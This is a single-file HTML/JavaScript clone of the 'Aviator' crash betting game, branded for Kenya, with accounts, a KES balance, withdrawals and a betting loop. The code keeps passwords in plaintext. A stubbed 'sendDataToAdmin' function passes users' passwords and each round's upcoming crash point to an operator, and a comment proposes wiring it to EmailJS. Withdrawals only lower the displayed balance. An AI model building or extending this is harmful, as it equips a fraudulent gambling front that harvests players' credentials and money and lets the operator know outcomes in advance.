<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Aviator Clone</title>
    <style>
        /* --- CSS STYLING --- */
        :root {
            --bg-color: #000000;
            --panel-color: #1b1b1b;
            --text-color: #ffffff;
            --accent-green: #28a745;
            --accent-yellow: #ffc107;
            --accent-red: #dc3545;
            --accent-blue: #007bff;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden; /* Prevent scrolling during game */
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* AUTH SCREENS */
        #auth-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #111;
            z-index: 100;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .auth-box {
            background: #222;
            padding: 20px;
            border-radius: 10px;
            width: 80%;
            max-width: 300px;
            text-align: center;
        }

        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            background: #333;
            border: 1px solid #444;
            color: white;
            border-radius: 5px;
        }

        .btn-auth {
            width: 100%;
            padding: 10px;
            background: var(--accent-blue);
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        .toggle-link {
            color: var(--accent-yellow);
            margin-top: 15px;
            display: block;
            cursor: pointer;
            font-size: 0.9em;
        }

        /* GAME UI */
        #game-screen {
            display: none; /* Hidden by default */
            height: 100%;
            flex-direction: column;
        }

        /* Top Bar: Withdraw & Balance */
        .top-bar {
            height: 10vh;
            display: flex;
            justify-content: space-between;
            padding: 10px;
            box-sizing: border-box;
        }

        .withdraw-btn {
            background-color: var(--accent-yellow);
            color: black;
            font-weight: bold;
            border-radius: 5px;
            width: 45%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            position: relative;
        }

        .balance-box {
            background-color: var(--accent-green);
            color: white;
            font-weight: bold;
            border-radius: 5px;
            width: 45%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        /* Withdrawal Modal Logic within Button */
        #withdraw-modal {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            width: 100%;
            background: #333;
            padding: 5px;
            border: 1px solid #555;
            z-index: 50;
        }
        #withdraw-modal input { width: 80%; font-size: 12px; height: 20px; }
        #withdraw-modal button { background: var(--accent-blue); width: 90%; padding: 5px; font-size: 12px; }

        /* Main Game Field (Canvas) */
        .game-field {
            flex-grow: 1;
            position: relative;
            background: radial-gradient(circle at center, #2a2a2a 0%, #000 100%);
            border-bottom: 2px solid #333;
            overflow: hidden;
        }

        canvas {
            display: block;
            width: 100%;
            height: 100%;
        }

        .live-multiplier {
            position: absolute;
            top: 20%;
            left: 50%;
            transform: translateX(-50%);
            font-size: 3rem;
            font-weight: bold;
            color: white;
            text-shadow: 0 0 10px rgba(255,255,255,0.5);
            z-index: 10;
        }

        /* History Bar */
        .history-bar {
            height: 30px;
            background: #111;
            display: flex;
            align-items: center;
            overflow-x: auto;
            padding: 0 10px;
            border-bottom: 1px solid #333;
        }
        .history-pill {
            background: #333;
            color: #aaa;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 0.8rem;
            margin-right: 5px;
            white-space: nowrap;
        }
        .history-pill.high { color: var(--accent-green); border: 1px solid var(--accent-green); }
        .history-pill.low { color: var(--accent-blue); }

        /* Bottom Controls */
        .controls {
            height: 25vh;
            background: #1b1b1b;
            display: flex;
            padding: 10px;
            gap: 10px;
            box-sizing: border-box;
        }

        .stake-box {
            width: 40%;
            background: #222;
            border: 1px solid #444;
            border-radius: 10px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .stake-box input {
            width: 80%;
            background: #000;
            border: 1px solid #555;
            color: white;
            font-size: 1.2rem;
            text-align: center;
        }

        .bet-btn-box {
            width: 60%;
            border-radius: 10px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            font-weight: bold;
            font-size: 1.2rem;
            text-transform: uppercase;
            transition: background 0.2s;
            color: white;
            text-align: center;
        }

        /* Button States */
        .btn-green { background: var(--accent-green); box-shadow: 0 4px 0 #1e7e34; }
        .btn-red { background: var(--accent-red); box-shadow: 0 4px 0 #bd2130; }
        .btn-yellow { background: var(--accent-yellow); color: black; box-shadow: 0 4px 0 #d39e00; }
        .btn-disabled { background: #444; color: #888; box-shadow: none; cursor: not-allowed; }

        .bet-subtext {
            font-size: 0.8rem;
            margin-top: 5px;
            font-weight: normal;
        }

        /* Admin Data Helper (Hidden mainly) */
        #admin-logger { display: none; }

    </style>
</head>
<body>

    <div id="auth-screen">
        <h2 style="color:var(--accent-red);">AVIATOR KENYA</h2>
        
        <div id="login-form" class="auth-box">
            <h3>Login</h3>
            <input type="tel" id="login-phone" placeholder="Phone Number">
            <input type="password" id="login-pass" placeholder="Password">
            <button class="btn-auth" onclick="handleLogin()">Log In</button>
            <span class="toggle-link" onclick="showSignup()">Create Account</span>
        </div>

        <div id="signup-form" class="auth-box" style="display:none;">
            <h3>Create Account</h3>
            <input type="tel" id="reg-phone" placeholder="Phone Number">
            <div style="position: relative;">
                <input type="password" id="reg-pass" placeholder="Password">
                <span onclick="togglePass('reg-pass')" style="position: absolute; right:10px; top:20px; cursor:pointer; font-size:10px;">Show</span>
            </div>
            <input type="password" id="reg-confirm" placeholder="Confirm Password">
            <button class="btn-auth" onclick="handleSignup()">Register</button>
            <span class="toggle-link" onclick="showLogin()">Already have an account? Log In</span>
        </div>
    </div>

    <div id="game-screen">
        
        <div class="top-bar">
            <div class="withdraw-btn" onclick="toggleWithdraw()">
                <span id="withdraw-label">WITHDRAW</span>
                <div id="withdraw-modal">
                    <input type="number" id="withdraw-amount" placeholder="Amount">
                    <button onclick="processWithdraw(event)">PROCEED</button>
                </div>
            </div>
            <div class="balance-box">
                <span>BALANCE</span>
                <span id="display-balance">1000.00</span>
            </div>
        </div>

        <div class="game-field">
            <div id="live-number" class="live-multiplier">1.00x</div>
            <canvas id="gameCanvas"></canvas>
        </div>

        <div class="history-bar" id="history-container">
            </div>

        <div class="controls">
            <div class="stake-box">
                <label style="font-size:10px; color:#888;">STAKE</label>
                <input type="number" id="stake-amount" value="10.00">
                <div style="display:flex; gap:5px; margin-top:5px;">
                    <button onclick="adjustStake(10)" style="background:#444; border:none; color:white;">+10</button>
                    <button onclick="adjustStake(50)" style="background:#444; border:none; color:white;">+50</button>
                </div>
            </div>

            <div id="main-bet-btn" class="bet-btn-box btn-green" onclick="handleBetButton()">
                <span id="btn-title">BET</span>
                <span id="btn-sub" class="bet-subtext">Next Round</span>
            </div>
        </div>
    </div>

    <script>
        /* --- LOGIC & STATE --- */
        
        // --- 1. USER & AUTH LOGIC ---
        let currentUser = null;

        function showSignup() {
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('signup-form').style.display = 'block';
        }

        function showLogin() {
            document.getElementById('signup-form').style.display = 'none';
            document.getElementById('login-form').style.display = 'block';
        }

        function togglePass(id) {
            const x = document.getElementById(id);
            x.type = x.type === "password" ? "text" : "password";
        }

        function handleSignup() {
            const p = document.getElementById('reg-phone').value;
            const pass = document.getElementById('reg-pass').value;
            const conf = document.getElementById('reg-confirm').value;

            if(!p || !pass) return alert("Fill all fields");
            if(pass !== conf) return alert("Passwords do not match");

            // Save to LocalStorage
            const user = { phone: p, password: pass, balance: 1000.00 };
            localStorage.setItem('aviator_user_' + p, JSON.stringify(user));
            alert("Account Created! Please Login.");
            showLogin();
            
            // SIMULATE SENDING DATA TO ADMIN
            sendDataToAdmin("NEW USER", user);
        }

        function handleLogin() {
            const p = document.getElementById('login-phone').value;
            const pass = document.getElementById('login-pass').value;
            const stored = localStorage.getItem('aviator_user_' + p);

            if (stored) {
                const user = JSON.parse(stored);
                if (user.password === pass) {
                    currentUser = user;
                    currentUser.phone = p; // Ensure ID
                    document.getElementById('auth-screen').style.display = 'none';
                    document.getElementById('game-screen').style.display = 'flex';
                    updateBalanceDisplay();
                    // Start Game Loop only after login
                    startGameLoop(); 
                } else {
                    alert("Wrong Password");
                }
            } else {
                alert("User not found. Create account.");
            }
        }

        // Session Check on Load
        window.onload = function() {
            // Force login every time page refreshes/closes as requested
            document.getElementById('auth-screen').style.display = 'flex';
        };

        function updateBalanceDisplay() {
            document.getElementById('display-balance').innerText = currentUser.balance.toFixed(2);
            localStorage.setItem('aviator_user_' + currentUser.phone, JSON.stringify(currentUser));
        }

        function processWithdraw(e) {
            e.stopPropagation(); // Stop bubbling
            const amt = parseFloat(document.getElementById('withdraw-amount').value);
            if(amt > 0 && amt <= currentUser.balance) {
                currentUser.balance -= amt;
                updateBalanceDisplay();
                
                const btn = document.querySelector('#withdraw-modal button');
                btn.innerText = "SUBMITTED";
                btn.style.background = "gray";
                
                setTimeout(() => {
                    document.getElementById('withdraw-modal').style.display = 'none';
                    document.getElementById('withdraw-label').innerText = "WITHDRAW";
                    btn.innerText = "PROCEED";
                    btn.style.background = "var(--accent-blue)";
                    // Send Withdrawal Data to Admin
                    sendDataToAdmin("WITHDRAWAL REQUEST", {phone: currentUser.phone, amount: amt, time: new Date()});
                }, 1500);
            } else {
                alert("Invalid Amount");
            }
        }

        function toggleWithdraw() {
            const modal = document.getElementById('withdraw-modal');
            modal.style.display = modal.style.display === 'block' ? 'none' : 'block';
        }

        function adjustStake(val) {
            const input = document.getElementById('stake-amount');
            input.value = (parseFloat(input.value) + val).toFixed(2);
        }

        // --- 2. ADMIN SIMULATION (DATA SENDING) ---
        function sendDataToAdmin(type, data) {
            console.log("SENDING TO ADMIN PANEL (" + type + "):", data);
            // NOTE: In a real scenario, you would use EmailJS here.
            // Example: emailjs.send("service_id", "template_id", {message: JSON.stringify(data)});
        }


        // --- 3. GAME ENGINE & PHYSICS ---
        
        const canvas = document.getElementById('gameCanvas');
        const ctx = canvas.getContext('2d');
        let width, height;
        
        // Resize canvas
        function resize() {
            width = canvas.width = canvas.parentElement.clientWidth;
            height = canvas.height = canvas.parentElement.clientHeight;
        }
        window.addEventListener('resize', resize);
        resize();

        // STATE VARIABLES
        let gameState = 'WAITING'; // WAITING, FLYING, BUSTED
        let multiplier = 1.00;
        let crashPoint = 1.00;
        let startTime = 0;
        
        // BETTING STATE
        let nextRoundBet = 0; // Amount queued for next round
        let currentBet = 0;   // Amount in current flying round
        let isBettingNext = false; // Has user pressed Bet for next round?
        let isBettingLive = false; // Is user currently in the air?
        
        // Synchronization (Nairobi Time Mock)
        // We generate a random seed based on current minutes/seconds to keep it global
        function getGlobalCrashPoint() {
            // Rounds time to nearest 10 seconds to create "Rounds"
            const timeSeed = Math.floor(Date.now() / 15000); 
            // Simple deterministic pseudo-random function
            const x = Math.sin(timeSeed) * 10000;
            const rand = x - Math.floor(x); 
            
            // Aviator Logic: heavy on low numbers, rare high numbers
            // E.g. 1 / rand gives distribution, clipped.
            let cp = 0.99 / (1 - rand);
            if (cp < 1) cp = 1; 
            // Cap at reasonable max for simulation
            if (cp > 100) cp = 100; 
            return Math.floor(cp * 100) / 100; 
        }

        // --- ANIMATION LOOP ---
        let animationId;
        let planeX = 0;
        let planeY = 0;
        let countdown = 5;

        function startGameLoop() {
            requestAnimationFrame(loop);
        }

        function loop() {
            ctx.clearRect(0, 0, width, height);
            drawGrid();
            
            const now = Date.now();

            if (gameState === 'WAITING') {
                // 5 Second Countdown
                drawPlaneWaiting();
                document.getElementById('live-number').innerText = "Starting...";
                document.getElementById('live-number').style.color = "white";
                
                // Update Buttons for Waiting Stage
                updateButtonsWaiting();

                if (now > startTime + 5000) {
                    gameState = 'FLYING';
                    startFlying();
                } else {
                   // Show Countdown progress
                   const left = Math.ceil(5 - (now - startTime)/1000);
                   document.getElementById('live-number').innerText = `Next Round: ${left}s`;
                }

            } else if (gameState === 'FLYING') {
                // Calculate Multiplier
                const flightTime = (now - startTime) / 1000; // seconds
                // Exponential growth curve roughly like Aviator
                multiplier = 1.0 + (flightTime * flightTime * 0.1) + (flightTime * 0.05);
                
                // Update UI
                document.getElementById('live-number').innerText = multiplier.toFixed(2) + "x";
                
                // Check Crash
                if (multiplier >= crashPoint) {
                    gameState = 'BUSTED';
                    handleBust();
                } else {
                    movePlane(flightTime);
                    drawPlane();
                    updateButtonsFlying();
                }

            } else if (gameState === 'BUSTED') {
                document.getElementById('live-number').innerText = "FLEW AWAY!";
                document.getElementById('live-number').style.color = "var(--accent-red)";
                drawPlaneStatic(); // Frozen plane
                
                if (now > startTime + 3000) { // 3 seconds delay before new round
                    resetGame();
                }
            }

            animationId = requestAnimationFrame(loop);
        }

        function resetGame() {
            gameState = 'WAITING';
            startTime = Date.now();
            crashPoint = getGlobalCrashPoint(); // Generate NEW crash point for everyone
            // Send this crash point to admin so they know the "Future"
            sendDataToAdmin("GENERATED ROUND", {time: new Date(), crashPoint: crashPoint});
            
            // Logic: Move queued bet to live bet
            if (isBettingNext) {
                currentBet = nextRoundBet;
                nextRoundBet = 0;
                isBettingNext = false;
                isBettingLive = true;
                // DEDUCT BALANCE HERE (Strictly as requested: when plane starts)
                currentUser.balance -= currentBet;
                updateBalanceDisplay();
            } else {
                isBettingLive = false;
                currentBet = 0;
            }
            
            // Update History
            addHistory(multiplier);
        }

        function startFlying() {
            startTime = Date.now(); // Reset start time for flight calc
        }

        function handleBust() {
            startTime = Date.now(); // Reset for bust cooldown
            if (isBettingLive) {
                // User didn't cash out
                isBettingLive = false;
                currentBet = 0;
                // Balance was already deducted at start, so just lost.
            }
        }

        // --- PLANE VISUALS ---
        function movePlane(t) {
            // 1. Diagonal move (0 to 75% width)
            const maxX = width * 0.75;
            const progress = Math.min(t / 4, 1); // Take 4 seconds to reach "cruise"
            
            planeX = progress * maxX;
            
            // 2. Vertical logic
            // Start at bottom, go up diagonally
            const startY = height - 50;
            const endY = height * 0.2; // High up
            
            let baseY = startY - (progress * (startY - endY));
            
            // 3. Wave motion (only after reaching cruise phase or during ascent)
            if (progress > 0.1) {
                const wave = Math.sin(t * 3) * 20; // Smooth wave
                planeY = baseY + wave;
            } else {
                planeY = baseY;
            }
        }

        function drawPlane() {
            ctx.fillStyle = "red";
            // Simple Plane Shape
            ctx.beginPath();
            ctx.moveTo(planeX, planeY);
            ctx.lineTo(planeX - 40, planeY + 10);
            ctx.lineTo(planeX - 40, planeY - 10);
            ctx.fill();
            
            // Trajectory Line (Rope metaphor)
            ctx.strokeStyle = "rgba(220, 53, 69, 0.5)";
            ctx.lineWidth = 3;
            ctx.beginPath();
            ctx.moveTo(0, height); // x=0, y=max
            
            // Bezier curve to plane
            ctx.quadraticCurveTo(planeX * 0.5, height, planeX, planeY);
            ctx.stroke();
        }

        function drawPlaneWaiting() {
            // Plane on runway
            const x = 20;
            const y = height - 40;
            ctx.fillStyle = "#555";
            ctx.beginPath();
            ctx.moveTo(x, y);
            ctx.lineTo(x - 20, y + 10);
            ctx.lineTo(x - 20, y - 10);
            ctx.fill();
        }

        function drawPlaneStatic() {
            // Plane stuck where it busted
            drawPlane(); 
        }

        function drawGrid() {
            ctx.strokeStyle = "#333";
            ctx.lineWidth = 1;
            // Vertical lines moving
            const offset = (Date.now() / 50) % 100;
            for (let i = 0; i < width; i += 100) {
                ctx.beginPath();
                ctx.moveTo(i - offset, 0);
                ctx.lineTo(i - offset, height);
                ctx.stroke();
            }
            // Horizontal lines
            for (let j = 0; j < height; j += 50) {
                ctx.beginPath();
                ctx.moveTo(0, j);
                ctx.lineTo(width, j);
                ctx.stroke();
            }
        }

        function addHistory(val) {
            const container = document.getElementById('history-container');
            const div = document.createElement('div');
            div.className = 'history-pill ' + (val > 2.0 ? 'high' : 'low');
            div.innerText = val.toFixed(2) + 'x';
            container.prepend(div); // Add to start
            if (container.children.length > 10) container.removeChild(container.lastChild);
        }


        // --- 4. BUTTON LOGIC (The Core Request) ---

        function handleBetButton() {
            const stakeInput = parseFloat(document.getElementById('stake-amount').value);

            // SCENARIO A: WAITING FOR NEXT ROUND
            if (gameState === 'WAITING') {
                if (isBettingNext) {
                    // Cancel Bet
                    isBettingNext = false;
                    nextRoundBet = 0;
                } else {
                    // Place Bet
                    if (stakeInput > currentUser.balance) return alert("Insufficient Balance");
                    isBettingNext = true;
                    nextRoundBet = stakeInput;
                }
            } 
            // SCENARIO B: FLYING (GAME ACTIVE)
            else if (gameState === 'FLYING') {
                if (isBettingLive) {
                    // CASH OUT ACTION
                    const winAmount = currentBet * multiplier;
                    currentUser.balance += winAmount;
                    updateBalanceDisplay();
                    isBettingLive = false; // User is out safely
                    currentBet = 0;
                    
                    // Log Winnings
                    sendDataToAdmin("WIN", {phone: currentUser.phone, profit: winAmount});
                } else {
                    // Place bet for NEXT round
                    if (isBettingNext) {
                        // Cancel Next Round Bet
                        isBettingNext = false;
                        nextRoundBet = 0;
                    } else {
                        // Join Next Round
                        if (stakeInput > currentUser.balance) return alert("Insufficient Balance");
                        isBettingNext = true;
                        nextRoundBet = stakeInput;
                    }
                }
            }
            // SCENARIO C: BUSTED
            else {
                 // Same as Waiting essentially
                 if (isBettingNext) {
                    isBettingNext = false;
                    nextRoundBet = 0;
                } else {
                    if (stakeInput > currentUser.balance) return alert("Insufficient Balance");
                    isBettingNext = true;
                    nextRoundBet = stakeInput;
                }
            }
        }

        function updateButtonsWaiting() {
            const btn = document.getElementById('main-bet-btn');
            const title = document.getElementById('btn-title');
            const sub = document.getElementById('btn-sub');

            if (isBettingNext) {
                // User has placed a bet for this upcoming round
                btn.className = "bet-btn-box btn-red";
                title.innerText = "CANCEL";
                sub.innerText = "Waiting for round...";
            } else {
                // User has not bet yet
                btn.className = "bet-btn-box btn-green";
                title.innerText = "BET";
                sub.innerText = document.getElementById('stake-amount').value + " KES";
            }
        }

        function updateButtonsFlying() {
            const btn = document.getElementById('main-bet-btn');
            const title = document.getElementById('btn-title');
            const sub = document.getElementById('btn-sub');

            if (isBettingLive) {
                // CASH OUT MODE
                const currentWin = (currentBet * multiplier).toFixed(2);
                btn.className = "bet-btn-box btn-yellow";
                title.innerText = "CASH OUT";
                sub.innerText = currentWin + " KES";
            } else {
                // User missed this round, allow betting for next
                if (isBettingNext) {
                    btn.className = "bet-btn-box btn-red";
                    title.innerText = "CANCEL";
                    sub.innerText = "Bet for next round placed";
                } else {
                    btn.className = "bet-btn-box btn-green";
                    title.innerText = "BET";
                    sub.innerText = "For Next Round";
                }
            }
        }

        // Start Logic
        resetGame(); // Initialize game variables
    </script>
</body>
</html>
